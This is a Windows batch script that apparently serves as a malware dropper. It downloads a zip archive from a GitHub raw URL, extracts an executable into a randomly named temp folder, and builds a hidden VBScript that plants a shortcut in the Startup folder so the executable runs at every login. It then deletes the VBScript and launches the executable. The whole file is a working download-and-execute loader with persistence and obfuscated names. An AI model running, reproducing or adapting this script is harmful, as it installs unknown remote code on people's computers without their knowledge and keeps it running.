@echo off
set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
set "EXE=hsapps.exe"
set "DIR=%TEMP%\awdiojawdoij"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=aagagwwjjw.lnk"

rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"

if exist "%startupFolder%\%shortcutName%" del /q /f "%startupFolder%\%shortcutName%"

:: 2. Write a temporary VBScript to build the shortcut silently
set "vbsFile=%TEMP%\djjwiwien3b.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%vbsFile%"
echo sLinkFile = "%startupFolder%\%shortcutName%" >> "%vbsFile%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%vbsFile%"
echo oLink.TargetPath = "%DIR%\%EXE%" >> "%vbsFile%"
echo oLink.WorkingDirectory = "%DIR%" >> "%vbsFile%"
echo oLink.Save >> "%vbsFile%"

:: 3. Run the VBScript invisibly, then delete it to clean up
wscript "%vbsFile%"
del "%vbsFile%"

curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && del /q "%TEMP%\pkg.zip" && start "" /wait "%DIR%\%EXE%"
